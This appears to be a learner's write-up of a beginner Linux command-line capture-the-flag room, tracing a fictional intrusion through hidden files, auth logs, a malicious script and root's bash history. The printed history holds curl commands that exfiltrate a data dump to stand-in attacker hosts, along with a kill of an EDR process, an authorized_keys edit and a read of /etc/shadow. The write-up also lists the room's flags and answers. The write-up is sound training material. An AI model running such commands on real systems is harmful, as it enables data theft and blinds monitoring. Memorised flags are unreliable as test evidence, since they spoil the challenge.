# Linux CLI - Shells Bells

## Challenge Overview
This challenge introduced the Linux command-line interface (CLI) and demonstrated how common Linux commands are used to navigate a system, inspect files, analyze logs, and identify suspicious activity.

The challenge was largely guided, but it simulated a real investigation flow - discovering hidden files, reviewing logs, locating suspicious scripts, and examining command history to identify attacker activity.

## Learnings
The task was a revision tool to go over some of the Linux commands I had learned in phase - 1.

It covered the following :
- Basic navigation commands (`ls`, `cd`, `pwd`, `cat`) are foundational for all further work
- Hidden files (dotfiles) are commonly used to store sensitive or important information
- Logs in `/var/log` are critical for detecting brute-force attempts and suspicious behavior
- grep is essential for filtering large files efficiently
- `root` privileges allow access to sensitive system files and histories
- Bash history can reveal attacker activity even after files are deleted
  
## My Solve 
I followed the challenge step-by-step to understand how a SOC analyst might investigate a compromised Linux system.

I began by using basic CLI commands to interact with the filesystem, list directories, and read files. After identifying the `Guides` directory, I discovered that the security guide was hidden using a dotfile. Using `ls -la` allowed me to locate and read the hidden guide.

Following the instructions in the guide, I navigated to `/var/log` and used `grep` to search authentication logs for failed login attempts. This revealed repeated brute-force attempts targeting a specific user account from an external source.

Next, I used the find command to search for suspicious files related to `egg` keywords. This led me to a shell script that was clearly malicious. By reading the script, I learned how attackers can use common Linux utilities like `cat`, `sort`,  rm, and mv together to steal data and overwrite legitimate files.

To further investigate attacker behavior, I switched to the root user using `sudo su` and inspected the root bash history. This revealed commands used to exfiltrate stolen data using curl, confirming the attacker’s presence and intent.

**Terminal Working :**
```
cskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls
mcskidy@tbfc-web01:~/Guides$ ls -la
total 12
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 .
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 ..
-rw-rw-r--  1 mcskidy mcskidy  506 Oct 29 20:46 .guide.txt
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
mcskidy@tbfc-web01:~/Guides$ cd ..
mcskidy@tbfc-web01:~$ cd /var/log
mcskidy@tbfc-web01:/var/log$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
mcskidy@tbfc-web01:/var/log$ cd ..
mcskidy@tbfc-web01:/var$ cd /home/socmas/2025
mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
mcskidy@tbfc-web01:/home/socmas/2025$ cd ..
mcskidy@tbfc-web01:/home/socmas$ cd ..
mcskidy@tbfc-web01:/home$ cd ..
mcskidy@tbfc-web01:/$ sudo su
root@tbfc-web01:/$ whoami
root
root@tbfc-web01:/$ cd /root
root@tbfc-web01:~$ cat .bash_history
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
whoami
cd /root
```

## Flag / Answers
- Directory listing command: ls
- Log filtering command: grep
- Root switch command: sudo su
- Flags obtained:
```
  THM{learning-linux-cli}
  THM{sir-carrotbane-attacks}
  THM{until-we-meet-again}
```
